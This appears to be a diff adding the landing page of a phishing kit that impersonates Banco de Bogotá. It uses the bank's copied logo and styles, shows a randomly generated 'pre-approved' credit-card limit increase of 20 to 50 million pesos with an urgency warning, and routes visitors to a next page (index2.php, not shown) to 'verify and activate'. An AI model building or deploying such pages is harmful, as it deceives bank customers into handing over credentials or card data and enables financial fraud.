@@ -1,0 +1,201 @@
+<?php
+
+
+// Generar monto aleatorio entre 20 y 50 millones (múltiplos de 1 millón)
+$monto_millones = rand(20, 50);
+$monto_formateado = number_format($monto_millones * 1000000, 0, ',', '.');
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="bogota_files/acb24bb6c10e72d0.css" data-precedence="next">
+    <title>Oferta Preaprobada - Banco de Bogotá</title>
+    <link rel="icon" href="bogota_files/favicon.ico" sizes="256x256" type="image/x-icon">
+    <style>
+        /* Badge pulsante */
+        .badge-preaprobado {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #dcfce7;
+            border: 1px solid #86efac;
+            border-radius: 999px;
+            padding: 4px 14px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: #15803d;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+        .badge-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: #16a34a;
+            animation: pulse 1.4s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50%       { opacity: 0.4; transform: scale(0.7); }
+        }
+
+        /* Monto destacado */
+        .monto {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #003087;
+            line-height: 1;
+            letter-spacing: -0.02em;
+        }
+        .monto span {
+            font-size: 1.4rem;
+            font-weight: 700;
+            vertical-align: super;
+        }
+
+        /* Card de beneficios */
+        .beneficio {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .beneficio:last-child { border-bottom: none; }
+        .beneficio-icon {
+            width: 36px; height: 36px;
+            border-radius: 8px;
+            background: #eef4ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .beneficio-icon svg { width: 18px; height: 18px; color: #003087; }
+        .beneficio-title { font-size: 0.85rem; font-weight: 700; color: #1a2a4a; }
+        .beneficio-desc  { font-size: 0.78rem; color: #667; margin-top: 1px; }
+
+        /* Aviso de expiración */
+        .expira {
+            background: #fffbeb;
+            border: 1px solid #fcd34d;
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            color: #92400e;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .expira svg { width: 16px; height: 16px; flex-shrink: 0; }
+    </style>
+</head>
+<body class="geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable antialiased">
+    <div class="w-full bg-gray-50 flex justify-center items-center p-5" style="min-height: 100vh;">
+        <div class="p-6 w-full max-w-md">
+
+            <!-- Logo -->
+            <div class="flex justify-center mb-6">
+                <img alt="Banco de Bogotá" width="200" height="60" decoding="async"
+                     style="color:transparent" src="bogota_files/logo.webp">
+            </div>
+
+            <!-- Card principal -->
+            <div class="flex flex-col gap-4 bg-white rounded-xl shadow-lg w-full p-8">
+
+                <!-- Badge -->
+                <div class="flex justify-center">
+                    <div class="badge-preaprobado">
+                        <span class="badge-dot"></span>
+                        Oferta Preaprobada
+                    </div>
+                </div>
+
+                <!-- Encabezado -->
+                <div class="text-center">
+                    <p class="text-lg font-semibold text-gray-600 mb-2">Aumento de Cupo de Tarjeta</p>
+                    <p class="text-sm text-gray-500 mb-4">Tienes disponible un aumento de cupo de hasta</p>
+                    <div class="monto"><span>$</span><?php echo $monto_formateado; ?></div>
+                    <p class="text-sm text-gray-400 mt-2">pesos colombianos</p>
+                </div>
+
+                <hr class="border-gray-100">
+
+                <!-- Beneficios -->
+                <div>
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Beneficios incluidos</p>
+
+                    <div class="beneficio">
+                        <div class="beneficio-icon">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                      d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <p class="beneficio-title">Sin trámites adicionales</p>
+                            <p class="beneficio-desc">Tu cupo se activa de forma inmediata tras la verificación.</p>
+                        </div>
+                    </div>
+
+                    <div class="beneficio">
+                        <div class="beneficio-icon">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                      d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <p class="beneficio-title">Tasa preferencial</p>
+                            <p class="beneficio-desc">Aplican condiciones especiales por ser cliente preferente.</p>
+                        </div>
+                    </div>
+
+                    <div class="beneficio">
+                        <div class="beneficio-icon">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                      d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <p class="beneficio-title">100% en línea</p>
+                            <p class="beneficio-desc">No necesitas ir a una sucursal ni firmar documentos físicos.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Aviso expiración -->
+                <div class="expira">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                              d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                    Esta oferta es exclusiva y puede expirar en cualquier momento.
+                </div>
+
+                <!-- Botón -->
+                <button onclick="window.location.href='index2.php'"
+                        class="mt-2 bg-blue-600 text-white p-3 rounded-full font-bold text-lg cursor-pointer hover:bg-blue-700 transition-colors text-center w-full">
+                    Verificar y Activar Cupo
+                </button>
+
+                <p class="text-center text-xs text-gray-400">
+                    Al continuar aceptas los <a href="#" class="text-blue-500 underline">términos y condiciones</a> del Banco de Bogotá.
+                </p>
+
+            </div>
+
+            <!-- Imagen informativa -->
+            <div class="mt-8">
+                <img alt="Info" loading="lazy" width="400" height="100" decoding="async"
+                     class="w-full" style="color:transparent" src="cuentafacil.png">
+            </div>
+
+        </div>
+    </div>
+</body>
+</html>
